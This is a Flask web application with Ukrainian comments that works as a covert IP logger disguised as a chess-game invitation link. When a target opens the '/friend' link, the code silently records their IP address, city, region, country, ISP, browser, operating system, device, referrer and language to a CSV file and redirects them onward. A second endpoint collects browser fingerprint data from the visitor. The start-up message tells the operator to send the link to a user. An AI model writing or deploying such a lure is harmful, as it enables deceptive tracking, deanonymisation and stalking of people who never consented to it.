from flask import Flask, request, render_template, redirect, jsonify
import user_agents
import requests
from datetime import datetime
import csv

app = Flask(__name__)

def get_public_ip():
    try:
        resp = requests.get("https://api.ipify.org?format=json", timeout=5)
        return resp.json()["ip"]
    except Exception:
        return "N/A"

def get_geo_info(ip):
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        data = resp.json()
        return data.get("city"), data.get("region"), data.get("country"), data.get("org")
    except:
        return "N/A", "N/A", "N/A", "N/A"

# Домашня сторінка, залишу по приколу 
@app.route("/")
def home():
    return render_template("invite.html")

# Назва сторінки, можна замінити на щось інше 
@app.route("/friend")
def chess_invite():
    ip = request.headers.get("CF-Connecting-IP") or request.remote_addr
    ua_string = request.headers.get("User-Agent", "")
    ua = user_agents.parse(ua_string)
    referrer = request.referrer
    lang = request.headers.get("Accept-Language", "")

    # геоінфо
    city, region, country, org = get_geo_info(ip)

    with open("visitors.csv", "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([
            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            ip,
            city, region, country, org,
            ua_string,
            ua.browser.family,
            ua.os.family,
            ua.device.family,
            referrer,
            lang
        ])

    return redirect("https://invite.linkchess.online/check") 

@app.route("/check")
def check():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    return render_template("check.html", user_ip=ip, year=datetime.now().year)

@app.route("/save_fingerprint", methods=["POST"]) 
def save_fingerprint():
    data = request.json
    with open("fingerprints.csv", "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([
            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            data.get("ip"),
            data.get("visitorId"),
            str(data.get("components"))
        ])
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    host = "0.0.0.0"
    port = 8080
    print(f"\n🚀 Flask server запущений!")
    print(f"🔗 Надішли користувачу це посилання: https://invite.linkchess.online/friend\n")
    app.run(host=host, port=port)
